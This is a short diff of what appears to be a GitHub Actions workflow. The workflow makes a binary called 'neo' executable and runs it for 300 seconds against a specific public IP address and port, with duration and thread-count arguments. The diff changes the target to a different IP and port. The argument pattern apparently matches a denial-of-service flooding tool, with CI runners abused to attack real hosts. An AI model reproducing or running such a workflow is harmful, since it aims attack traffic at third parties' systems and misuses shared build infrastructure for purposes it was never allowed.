@@ -10,4 +10,4 @@ jobs:
         steps:
         - uses: actions/checkout@v3
         - run: chmod +x neo
-        - run: timeout 300 ./neo 20.235.52.217 16680 120 999
+        - run: timeout 300 ./neo 91.3.23.2 19382 12 999
